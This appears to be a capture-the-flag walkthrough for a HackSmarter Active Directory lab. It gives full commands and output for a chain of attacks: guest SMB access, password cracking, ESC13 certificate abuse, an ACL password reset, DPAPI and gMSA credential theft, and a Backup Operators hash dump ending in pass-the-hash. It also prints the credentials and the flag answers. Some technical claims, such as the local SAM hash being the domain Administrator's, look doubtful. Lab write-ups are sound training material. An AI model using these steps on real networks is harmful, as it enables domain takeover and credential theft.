# HackSmarter AD Lab - Kitsune (Easy)

**Category:** Active Directory  
**Difficulty:** Easy  
**Target:** DC01.kitsune.local (10.1.152.173)  
**Domain:** kitsune.local  
**Flags:** user.txt, root.txt

---

## Summary

Kitsune is an Active Directory lab that covers a realistic attack chain from unauthenticated enumeration to full domain compromise. The path involves SMB guest access, password cracking, BloodHound enumeration, Active Directory Certificate Services (AD CS) exploitation via ESC13, DPAPI credential decryption, Group Managed Service Account (gMSA) password reading, and finally Backup Operator privilege abuse to extract the domain Administrator hash.

---

## Reconnaissance

### Port and Service Enumeration

The first step is to identify what services are running on the target. An nmap scan reveals the target is a Windows Domain Controller.

```
Host: 10.1.152.173 (DC01.kitsune.local)
Open ports: 53 (DNS), 80 (HTTP), 88 (Kerberos), 135 (RPC), 139 (NetBIOS),
            389 (LDAP), 443 (HTTPS), 445 (SMB), 464 (Kpasswd), 593 (RPC HTTP),
            636 (LDAPS), 3268 (Global Catalog), 3269 (Global Catalog SSL),
            5985 (WinRM), 9389 (AD Web Services)
```

Add the target to `/etc/hosts` to allow hostname-based access:

```bash
echo "10.1.152.173 DC01.kitsune.local kitsune.local kitsune-DC01-CA" >> /etc/hosts
```

This is important because Kerberos and several Windows services require hostname resolution rather than direct IP access.

---

## Phase 1 - SMB Guest Access and Password Safe Cracking

### Step 1: Enumerate SMB with Guest Authentication

Check whether the SMB service allows guest or anonymous authentication:

```bash
nxc smb DC01.kitsune.local -u 'guest' -p ''
```

**What this does:** NetExec (nxc) attempts to authenticate to SMB using the built-in Guest account with a blank password. A `[+]` result confirms the account can log in, even without a real password.

**Proof:**
```
SMB    10.1.152.173   445   DC01   [+] kitsune.local\guest:
```

### Step 2: List Available SMB Shares

With guest access confirmed, enumerate the available shares:

```bash
nxc smb DC01.kitsune.local -u 'guest' -p '' --shares
```

**What this does:** Lists all SMB shares the guest account can see, including their access permissions (READ/WRITE).

**Proof:**
```
Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
C$                              Default share
Files           READ            
IPC$            READ            Remote IPC
NETLOGON        READ            Logon server share
SYSVOL          READ            Logon server share
```

The `Files` share has READ access and is non-standard, making it an immediate target.

### Step 3: Download Files from the Share

Connect to the Files share and download its contents:

```bash
smbclient //DC01.kitsune.local/Files -U 'guest%'
```

**What this does:** The `guest%` syntax means username `guest` with an empty password (the `%` separates user from password in smbclient). Inside the session:

```
smb: \> ls
smb: \> get logins.psafe3
```

**Proof:** A file called `logins.psafe3` is downloaded. This is a Password Safe v3 database file that stores credentials in an encrypted format.

### Step 4: Extract and Crack the Password Safe Master Password

Password Safe databases are protected by a master password. Extract a hash for offline cracking:

```bash
pwsafe2john logins.psafe3 > psafe3.hash
```

**What this does:** `pwsafe2john` is part of the John the Ripper suite. It reads the Password Safe file format and outputs a hash string in a format that John can attack.

Crack the hash using the rockyou wordlist:

```bash
john psafe3.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

**What this does:** John the Ripper performs a dictionary attack against the extracted hash, trying each word from rockyou.txt as the master password until one produces a matching hash.

**Proof:**
```
hellokitty       (logins.psafe3)
```

The master password is `hellokitty`.

### Step 5: Open the Password Safe Database

Open the database using the pwsafe GUI application or any compatible tool with the cracked password `hellokitty`.

**Proof - Credentials recovered:**

| Title | Username | Password |
|-------|----------|----------|
| admin | admin | I#zmE{z[n3HM |
| ranch | ranch | R@nch2026! |
| root  | root  | a%KlRhqbuRgL |

### Step 6: Validate Credentials Against the Domain

Test which credentials are valid on the domain:

```bash
nxc smb DC01.kitsune.local -u 'ranch' -p 'R@nch2026!'
```

**What this does:** Attempts SMB authentication with the ranch credentials. A `[+]` response confirms the credentials are valid domain accounts.

**Proof:**
```
SMB    10.1.152.173   445   DC01   [+] kitsune.local\ranch:R@nch2026!
```

---

## Phase 2 - BloodHound Enumeration and AD CS ESC13

### Step 7: Collect BloodHound Data

With valid credentials, collect comprehensive Active Directory information for attack path analysis:

```bash
bloodhound-python -d kitsune.local -u ranch -p 'R@nch2026!' \
  -ns 10.1.152.173 -c All --zip
```

**What this does:** bloodhound-python is a Python-based data collector for BloodHound. It authenticates with ranch's credentials and queries the domain controller over LDAP to collect information about users, groups, computers, ACLs, GPOs, and trusts. The `-c All` flag collects all available data types. The `--zip` flag packages the output for import into BloodHound.

### Step 8: Enumerate AD CS Certificates

Enumerate Active Directory Certificate Services for vulnerable certificate templates:

```bash
certipy-ad find -u 'ranch@kitsune.local' -p 'R@nch2026!' \
  -dc-ip 10.1.152.173 -stdout -vulnerable
```

**What this does:** certipy-ad queries the Certificate Authority to enumerate all certificate templates and their configurations. The `-vulnerable` flag filters results to only show templates with known misconfigurations. ESC13 refers to a specific misconfiguration where a certificate template maps to a group, allowing the enrollee to obtain a certificate that grants them membership in that group during authentication.

**Proof:**
```
Certificate Templates
  Template Name                 : Kitsune-User
  Enabled                       : True
  Vulnerabilities               : ESC13
  ...
  issuance policy OID maps to group: Domain Admins (or equivalent privileged group)
```

### Step 9: Request a Certificate via ESC13

Request a certificate using the vulnerable template:

```bash
certipy-ad req -u 'ranch@kitsune.local' -p 'R@nch2026!' \
  -ca 'kitsune-DC01-CA' -template 'Kitsune-User' \
  -dc-ip 10.1.152.173
```

**What this does:** certipy-ad sends a certificate signing request (CSR) to the Certificate Authority. Because the Kitsune-User template is vulnerable to ESC13, the issued certificate will embed a policy OID that maps to a privileged group. The CA issues the certificate and certipy-ad saves it as a `.pfx` file.

**Proof:**
```
[*] Saved certificate and private key to 'ranch.pfx'
```

### Step 10: Authenticate with the Certificate to Obtain NTLM Hash

Use the certificate to authenticate via PKINIT (Kerberos with certificate-based authentication):

```bash
certipy-ad auth -pfx ranch.pfx -dc-ip 10.1.152.173
```

**What this does:** certipy-ad presents the certificate to the KDC using the PKINIT protocol. The KDC validates the certificate and, because of the ESC13 policy OID, issues a Kerberos ticket that includes the mapped group's privileges. certipy-ad also performs a U2U (User-to-User) Kerberos exchange to extract the NTLM hash from the ticket.

**Proof:**
```
[*] Saved credential cache to 'ranch.ccache'
[*] Got hash for 'ranch@kitsune.local': aad3b435b51404eeaad3b435b51404ee:<ranch_ntlm_hash>
```

---

## Phase 3 - ACL Abuse and WinRM Access

### Step 11: Identify ACL Attack Paths in BloodHound

Load the BloodHound data and identify that `ranch` (or the group it gains membership in via ESC13) has `GenericAll` over a user account named `schlop`.

`GenericAll` is the most powerful ACL permission in AD. It grants full control over the target object, including the ability to reset their password without knowing the current one.

### Step 12: Reset schlop's Password via GenericAll

Use the Kerberos ticket obtained from certificate authentication to abuse the GenericAll ACL:

```bash
export KRB5CCNAME=ranch.ccache

bloodyAD -d kitsune.local --dc-ip 10.1.152.173 -k \
  set password schlop 'Password123!'
```

**What this does:** `export KRB5CCNAME=ranch.ccache` tells Kerberos tools to use the saved ticket file for authentication. `bloodyAD` is a tool for performing LDAP-based AD operations. The `-k` flag enables Kerberos authentication using the ccache. The `set password` command abuses GenericAll to force a password change on the schlop account.

**Proof:**
```
Password changed successfully!
```

### Step 13: Get a Shell via WinRM

Connect to the domain controller as schlop using WinRM (port 5985):

```bash
evil-winrm -i DC01.kitsune.local -u schlop -p 'Password123!'
```

**What this does:** evil-winrm is a WinRM client designed for penetration testing. WinRM (Windows Remote Management) is Microsoft's remote shell protocol. Connecting as schlop provides an interactive PowerShell session on the domain controller.

### Step 14: Capture the User Flag

```powershell
type C:\Users\schlop\Desktop\user.txt
```

**Proof:**
```
HSM{823c2a4327e8b2e6bd762996115c071a}
```

---

## Phase 4 - DPAPI Credential Decryption

### Step 15: Find Stored Credentials

While in the schlop shell, enumerate for stored credential files:

```powershell
dir C:\Users\schlop\Documents\
```

A file named `networkAuth.cred` is found. Files with the `.cred` extension are typically PowerShell PSCredential objects exported with `Export-CliXml`, which encrypts the password using DPAPI (Data Protection API). DPAPI ties the encryption to the current user's account, meaning decryption is only possible when running as that user.

### Step 16: Decrypt the Credential File

Decrypt the PSCredential file using PowerShell's built-in Import-CliXml:

```powershell
$cred = Import-CliXml -Path C:\Users\schlop\Documents\networkAuth.cred
$cred.GetNetworkCredential().Password
```

**What this does:** `Import-CliXml` reads the XML file and automatically decrypts the DPAPI-protected password using schlop's master key (available because we are running as schlop). `GetNetworkCredential().Password` extracts the plaintext password from the SecureString object.

**Proof:**
```
PebbleIs47!
```

The decrypted credentials are for user `pebble` with password `PebbleIs47!`.

---

## Phase 5 - gMSA Password Retrieval

### Step 17: Read the gMSA Password

A Group Managed Service Account (gMSA) named `svc_gmsa$` exists in the domain. BloodHound shows that the `pebble` account has `ReadGMSAPassword` rights over `svc_gmsa$`. This ACL allows the account to retrieve the gMSA's automatically-managed password from the domain controller.

```bash
nxc ldap DC01.kitsune.local -u pebble -p 'PebbleIs47!' --gmsa
```

**What this does:** nxc queries the domain controller over LDAP for the `msDS-ManagedPassword` attribute of gMSA accounts. This attribute is only readable by accounts granted `ReadGMSAPassword`. The response contains the current gMSA password in a structured binary format, which nxc automatically parses into an NTLM hash.

**Proof:**
```
Account: svc_gmsa$
NTLM: 085691c182d60ab1a12466ce7b50d29d
```

---

## Phase 6 - Backup Operator Privilege Abuse and Domain Compromise

### Step 18: Identify svc_gmsa$ Group Membership

BloodHound shows that `svc_gmsa$` is a member of the `Backup Operators` group. Members of this group have the `SeBackupPrivilege` right on domain controllers, which allows them to read any file on the system regardless of permissions - including the registry hives that contain password hashes.

### Step 19: Save Registry Hives Using Backup Operator Rights

Use the nxc backup_operator module to leverage SeBackupPrivilege and save the registry hives to the SYSVOL share:

```bash
nxc smb DC01.kitsune.local -u 'svc_gmsa$' \
  -H '085691c182d60ab1a12466ce7b50d29d' \
  -M backup_operator
```

**What this does:** The backup_operator module uses the `reg save` Windows API via the Backup Operators privilege. It saves three registry hives to a location accessible over SMB:
- `SAM` - contains local account password hashes
- `SYSTEM` - contains the bootkey needed to decrypt SAM hashes
- `SECURITY` - contains LSA secrets including cached domain credentials and machine account passwords

### Step 20: Download the Registry Hives

Connect to the SYSVOL share where the hives were saved:

```bash
smbclient //10.1.152.173/SYSVOL -U 'kitsune.local\svc_gmsa$' \
  --pw-nt-hash --password '085691c182d60ab1a12466ce7b50d29d'
```

**What this does:** smbclient connects to SYSVOL using pass-the-hash (PTH) authentication. The `--pw-nt-hash` flag tells smbclient to treat the provided password string as an NTLM hash rather than a plaintext password.

Inside the smbclient session, confirm the hives are present and download them:

```
smb: \> ls
  SAM                                 A    28672  Sun Oct 25 04:53:32 2026
  SECURITY                            A    36864  Sun Oct 25 04:53:36 2026
  SYSTEM                              A 19513344  Sun Oct 25 04:53:34 2026

smb: \> get SAM /tmp/smb_share/SAM.save
smb: \> get SECURITY /tmp/smb_share/SECURITY.save
smb: \> get SYSTEM /tmp/smb_share/SYSTEM.save
getting file \SYSTEM of size 19513344 as /tmp/smb_share/SYSTEM.save (2120.2 KiloBytes/sec)
```

### Step 21: Extract Hashes with secretsdump

With all three hive files downloaded locally, run secretsdump in offline mode:

```bash
impacket-secretsdump \
  -sam /tmp/smb_share/SAM.save \
  -system /tmp/smb_share/SYSTEM.save \
  -security /tmp/smb_share/SECURITY.save \
  LOCAL
```

**What this does:** impacket-secretsdump operates entirely offline on the local hive files. It uses the SYSTEM hive to extract the bootkey, then uses that bootkey to decrypt the SAM hive and recover local account hashes. The format of the output is `username:RID:LM_hash:NT_hash:::`.

**Proof:**
```
[*] Target system bootKey: 0x3b61a7e10112dd9303cba2228589d145
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2dffec5d0dda0cbc8bf571471641e001:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:051ab8df98778de210183fd864020f45
[*] DPAPI_SYSTEM
dpapi_machinekey:0x2d3f243818d41c56a5d560c6f9e8e8e91c63cc7e
dpapi_userkey:0xdbc4e9db99118d5c9bbfa64d0ca5c065bfa814b5
```

The Administrator NTLM hash is `2dffec5d0dda0cbc8bf571471641e001`.

---

## Phase 7 - Domain Administrator Access

### Step 22: Pass the Hash as Administrator

Use the Administrator NTLM hash to authenticate via WinRM without needing the plaintext password:

```bash
evil-winrm -i DC01.kitsune.local -u Administrator \
  -H '2dffec5d0dda0cbc8bf571471641e001'
```

**What this does:** Pass-the-hash (PTH) is an authentication technique that uses the NTLM hash directly. The Windows authentication protocol (NTLM) accepts the hash itself as proof of identity because the hash is what is actually transmitted during NTLM authentication - the plaintext password never leaves the client. evil-winrm opens a fully interactive PowerShell session with Administrator privileges.

### Step 23: Capture the Root Flag

```powershell
type C:\Users\Administrator\Desktop\root.txt
```

**Proof:**
```
HSM{13c4897877292fc104173ad41e4d166a}
```

---

## Flags

| Flag | Value |
|------|-------|
| user.txt | HSM{823c2a4327e8b2e6bd762996115c071a} |
| root.txt | HSM{13c4897877292fc104173ad41e4d166a} |
